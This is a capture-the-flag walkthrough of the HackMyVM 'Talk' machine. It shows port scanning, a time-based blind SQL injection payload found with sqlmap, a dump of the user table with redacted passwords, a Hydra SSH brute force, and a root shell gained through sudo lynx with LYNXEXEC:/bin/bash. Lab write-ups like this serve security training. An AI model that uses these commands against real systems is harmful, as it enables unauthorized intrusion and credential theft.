# Talk

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Talk | sml | Beginner | HackMyVM |

**Summary:** Talk is a beginner-level HackMyVM machine that demonstrates common web application vulnerabilities leading to system compromise. The attack path involves network discovery, web application reconnaissance, SQL injection exploitation to extract user credentials, SSH brute force attacks, and privilege escalation through a misconfigured sudo permission on the lynx browser. This machine showcases the importance of secure coding practices, proper input validation, and careful sudo configuration management.

---

## Reconnaissance

### Network Discovery

Initial network scanning was performed to identify the target machine within the virtual network:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.54 08:00:27:02:5B:95 VirtualBox
```

The target machine was identified at IP address `192.168.100.54` running on VirtualBox.

### Port Scanning

A comprehensive port scan was conducted using Nmap to identify running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ nmap -sC -sV -p- 192.168.100.54
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 13:55 WIB
Nmap scan report for 192.168.100.54
Host is up (0.0023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e3:fc:1b:74:e5:e3:c9:ef:6d:ac:df:b1:1e:47:83:ad (RSA)
|   256 10:bd:60:33:a0:d1:a4:7d:de:c8:29:0a:c4:7d:b1:aa (ECDSA)
|_  256 4b:fc:30:a8:12:69:e7:b2:ce:ad:99:f1:66:12:cd:8c (ED25519)
80/tcp open  http    nginx 1.14.2
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.14.2
|_http-title: chatME
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.24 seconds
```

Two services were identified:
- **SSH (Port 22)**: OpenSSH 7.9p1 Debian 10+deb10u2
- **HTTP (Port 80)**: nginx 1.14.2 serving a "chatME" application

### Web Application Analysis

Accessing the web application on port 80 revealed a login page for a chat application:

![](image.png)

The login form showed "Login to your account" with username and password fields, and was developed by "PJCaraig © 2018" as indicated at the bottom of the page.

---

## Initial Access

### HTTP Request Analysis

The login functionality was analyzed by capturing the POST request:

```bash
POST /login.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ifgls68gpl4e2eei2r9t61cguq
Host: 192.168.100.54
Origin: http://192.168.100.54
Referer: http://192.168.100.54/
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36

username=admin&password=admin
```

This POST request was saved to `login_request.txt` for further analysis.

### SQL Injection Discovery

SQLMap was used to test for SQL injection vulnerabilities in the login form:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ sqlmap -r login_request.txt --batch --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7707 FROM (SELECT(SLEEP(5)))honu) AND 'lLjj'='lLjj&password=admin
---
...
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
available databases [4]:
[*] chat
[*] information_schema
[*] mysql
[*] performance_schema
...
```

A time-based blind SQL injection vulnerability was discovered in the `username` parameter. The backend database was identified as MySQL/MariaDB with four databases available, including a `chat` database.

### Database Enumeration

The `chat` database was examined to identify its structure:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ sqlmap -r login_request.txt -D chat --tables --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [")]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7707 FROM (SELECT(SLEEP(5)))honu) AND 'lLjj'='lLjj&password=admin
---
...
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
Database: chat
[3 tables]
+-----------+
| user      |
| chat      |
| chat_room |
+-----------+
```

The database contained three tables, with the `user` table being of primary interest for credential extraction.

### Credential Extraction

The `user` table was dumped to extract user credentials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ sqlmap -r login_request.txt -D chat -T user --dump --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.11#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 7707 FROM (SELECT(SLEEP(5)))honu) AND 'lLjj'='lLjj&password=admin
---
...
web application technology: Nginx 1.14.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
Database: chat
Table: user
[6 entries]
+--------+-----------------+-------------+-----------------+--------------------------------+-----------+
| userid | email           | phone       | password        | username                       | your_name |
+--------+-----------------+-------------+-----------------+--------------------------------+-----------+
| 5      | david@david.com | 11          | a[REDACTED]     | david                          | david     |
| 4      | jerry@jerry.com | 111         | t[REDACTED]     | jerry                          | jerry     |
| 2      | nona@nona.com   | 1111        | m[REDACTED]     | nona                           | nona      |
| 1      | pao@yahoo.com   | 09123123123 | p[REDACTED]     | pao                            | PaoPao    |
| 6      | test@test.com   | 123         | t[REDACTED]     | test                           | test      |
| 3      | tina@tina.com   | 11111       | d[REDACTED]     | tina                           | tina      |
+--------+-----------------+-------------+-----------------+--------------------------------+-----------+
```

Six user accounts were discovered, including one test account created during reconnaissance.

### SSH Brute Force Attack

The extracted usernames and passwords were organized into separate files for a brute force attack:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ cat << EOF > user.txt
heredoc> david
heredoc> jerry
heredoc> nona
heredoc> pao
heredoc> test
heredoc> tina
heredoc> EOF

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ cat << EOF > pass.txt
heredoc> a[REDACTED]
heredoc> t[REDACTED]
heredoc> m[REDACTED]
heredoc> p[REDACTED]
heredoc> t[REDACTED]
heredoc> d[REDACTED]
heredoc> EOF
```

Hydra was used to perform SSH brute force authentication:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ hydra -L user.txt -P pass.txt ssh://192.168.100.54
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-31 18:23:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.100.54:22/
[22][ssh] host: 192.168.100.54   login: david   password: d[REDACTED]
[22][ssh] host: 192.168.100.54   login: jerry   password: m[REDACTED]
[22][ssh] host: 192.168.100.54   login: nona   password: t[REDACTED]
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-31 18:23:25
```

Three valid SSH credentials were discovered: david, jerry, and nona.

### SSH Access and User Flag

After discovering valid credentials, exploration revealed that multiple users had home directories with readable permissions. The user `nona` was identified as having the user flag. SSH access was established using the `nona` account:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/talk]
└─$ ssh nona@192.168.100.54
...
nona@192.168.100.54's password:
Linux talk 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64
...
nona@talk:~$ id
uid=1000(nona) gid=1000(nona) groups=1000(nona),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
nona@talk:~$ ls -la
total 36
drwxr-xr-x 3 nona nona 4096 Feb 18  2021 .
drwxr-xr-x 7 root root 4096 Feb 18  2021 ..
-rw-r--r-- 1 nona nona  220 Feb 18  2021 .bash_logout
-rw-r--r-- 1 nona nona 3526 Feb 18  2021 .bashrc
-rwx--x--x 1 nona nona 1920 Feb 18  2021 flag.sh
drwxr-xr-x 3 nona nona 4096 Feb 18  2021 .local
-rw-r--r-- 1 nona nona  807 Feb 18  2021 .profile
-rw------- 1 nona nona   13 Feb 18  2021 user.txt
-rw------- 1 nona nona   50 Feb 18  2021 .Xauthority
```

Successful access was obtained to the `nona` account, revealing the presence of `user.txt` and other interesting files.

---

## Privilege Escalation

### Sudo Permissions Analysis

Investigation revealed that the `nona` user had sudo permissions for the lynx browser:

```bash
nona@talk:~$ file /usr/bin/lynx
/usr/bin/lynx: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3811c36eddf42435e6e7332bb3038a6a07522526, stripped
nona@talk:~$ ls -la /usr/bin/lynx
-rwxr-xr-x 1 root root 1919936 Jan 10  2019 /usr/bin/lynx
```

### Lynx Browser Exploitation

The lynx browser was launched with sudo privileges and the `-exec` flag to enable local program execution:

```bash
nona@talk:~$ sudo /usr/bin/lynx -exec
```

Once inside the lynx browser, the `g` key was pressed to access the "Go to URL" function, and the following was entered:

![](image-1.png)

The image shows the lynx browser interface with the URL input field containing `LYNXEXEC:/bin/bash`. This leverages lynx's ability to execute local programs when the `-exec` flag is used, effectively providing a shell with root privileges. After entering this command, double enter was pressed to execute it.

### Root Access

After executing the LYNXEXEC command and pressing Enter twice, root access was obtained:

```bash
root@talk:/home/nona# id
uid=0(root) gid=0(root) groups=0(root)
root@talk:/home/nona# cd
root@talk:~# cat /root/root.txt /home/nona/user.txt
t[REDACTED]
w[REDACTED]
```

Both user and root flags were successfully retrieved, confirming complete system compromise. The machine was pwned!

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified target at 192.168.100.54 with SSH (22) and HTTP (80) services running on Debian Linux with nginx web server
2. **Vulnerability Discovery**: SQL injection vulnerability discovered in the username parameter of the login form using time-based blind injection techniques
3. **Exploitation**: Database enumeration extracted user credentials from the chat database, revealing 6 user accounts with plaintext passwords
4. **Internal Enumeration**: SSH brute force attack using extracted credentials successfully compromised three user accounts (david, jerry, nona)
5. **Privilege Escalation**: Exploited sudo permissions on lynx browser with -exec flag to execute /bin/bash via LYNXEXEC protocol, achieving root access
